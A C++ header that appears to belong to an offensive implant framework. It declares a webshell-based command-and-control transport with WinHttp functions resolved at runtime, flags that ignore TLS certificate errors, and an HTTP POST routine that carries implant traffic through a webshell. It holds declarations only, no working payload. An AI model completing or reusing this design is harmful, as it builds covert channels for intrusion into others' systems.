#ifndef STARBURST_TRANSPORT_WEBSHELL_H
#define STARBURST_TRANSPORT_WEBSHELL_H

#include <common.h>

#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )

#define WS_ACCESS_TYPE_DEFAULT_PROXY    0
#define WS_FLAG_SECURE                  0x00800000
#define WS_OPTION_SECURITY_FLAGS        31
#define WS_SECURITY_IGNORE_UNKNOWN_CA       0x00000100
#define WS_SECURITY_IGNORE_CERT_DATE        0x00002000
#define WS_SECURITY_IGNORE_CERT_CN          0x00001000
#define WS_SECURITY_IGNORE_CERT_USAGE       0x00000200
#define WS_ADDREQ_FLAG_ADD              0x20000000
#define WS_ADDREQ_FLAG_REPLACE          0x80000000
#define WS_DEFAULT_HTTP_PORT            80
#define WS_DEFAULT_HTTPS_PORT           443

#define WS_AUTH_COOKIE    0
#define WS_AUTH_HEADER    1
#define WS_AUTH_PARAMETER 2

namespace starburst {

    using namespace stardust;

    typedef void* ws_HINTERNET;

    typedef ws_HINTERNET (__stdcall *ws_fn_WinHttpOpen)(
        const wchar_t*, uint32_t, const wchar_t*, const wchar_t*, uint32_t );
    typedef ws_HINTERNET (__stdcall *ws_fn_WinHttpConnect)(
        ws_HINTERNET, const wchar_t*, uint16_t, uint32_t );
    typedef ws_HINTERNET (__stdcall *ws_fn_WinHttpOpenRequest)(
        ws_HINTERNET, const wchar_t*, const wchar_t*, const wchar_t*,
        const wchar_t*, const wchar_t**, uint32_t );
    typedef int (__stdcall *ws_fn_WinHttpSendRequest)(
        ws_HINTERNET, const wchar_t*, uint32_t, void*, uint32_t,
        uint32_t, uintptr_t );
    typedef int (__stdcall *ws_fn_WinHttpReceiveResponse)(
        ws_HINTERNET, void* );
    typedef int (__stdcall *ws_fn_WinHttpQueryDataAvailable)(
        ws_HINTERNET, uint32_t* );
    typedef int (__stdcall *ws_fn_WinHttpReadData)(
        ws_HINTERNET, void*, uint32_t, uint32_t* );
    typedef int (__stdcall *ws_fn_WinHttpCloseHandle)( ws_HINTERNET );
    typedef int (__stdcall *ws_fn_WinHttpSetOption)(
        ws_HINTERNET, uint32_t, void*, uint32_t );
    typedef int (__stdcall *ws_fn_WinHttpAddRequestHeaders)(
        ws_HINTERNET, const wchar_t*, uint32_t, uint32_t );

    struct WebshellHttpApis {
        ws_fn_WinHttpOpen                pWinHttpOpen;
        ws_fn_WinHttpConnect             pWinHttpConnect;
        ws_fn_WinHttpOpenRequest         pWinHttpOpenRequest;
        ws_fn_WinHttpSendRequest         pWinHttpSendRequest;
        ws_fn_WinHttpReceiveResponse     pWinHttpReceiveResponse;
        ws_fn_WinHttpQueryDataAvailable  pWinHttpQueryDataAvailable;
        ws_fn_WinHttpReadData            pWinHttpReadData;
        ws_fn_WinHttpCloseHandle         pWinHttpCloseHandle;
        ws_fn_WinHttpSetOption           pWinHttpSetOption;
        ws_fn_WinHttpAddRequestHeaders   pWinHttpAddRequestHeaders;
    };

    struct WebshellLinkState {
        WebshellHttpApis http;
        HMODULE          h_winhttp;
        ws_HINTERNET     h_session;
        bool             initialized;
    };

    struct WsParsedUrl {
        char     host[256];
        char     path[512];
        uint16_t port;
        bool     use_ssl;
    };

    auto declfn ws_resolve_winhttp(
        _Inout_ instance&          inst,
        _Out_   WebshellLinkState* state
    ) -> bool;

    auto declfn ws_parse_url(
        _In_  const char* url,
        _Out_ WsParsedUrl* parsed
    ) -> bool;

    auto declfn ws_http_post(
        _Inout_ instance&               inst,
        _In_    WebshellLinkState*       state,
        _In_    instance::WebshellLink*  link,
        _In_    uint8_t*                 data,
        _In_    uint32_t                 len,
        _Out_   uint8_t**                response,
        _Out_   uint32_t*                resp_len
    ) -> bool;

}

#endif
#endif
